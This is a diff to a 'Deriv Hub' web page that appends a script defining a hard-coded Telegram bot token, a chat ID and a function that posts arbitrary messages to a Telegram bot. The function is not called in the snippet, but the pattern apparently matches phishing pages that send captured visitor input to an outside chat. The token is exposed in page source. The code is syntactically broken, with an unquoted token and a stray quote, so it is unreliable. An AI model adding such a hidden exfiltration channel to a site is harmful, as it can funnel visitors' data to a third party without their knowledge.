@@ -97,6 +97,26 @@
 <footer>
     © 2026 Deriv Hub | Built by p2p agency 
 </footer>
+<!-- your page content above -->
+
+<script>
+const botToken = 7536734919:AAEnRvqupXQR-arbK7AWE4pz2IXQ7CkAYp8
+const chatId = 7536734919";
+
+function sendMessageToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    });
+}
+</script>
+
 
 </body>
 </html>
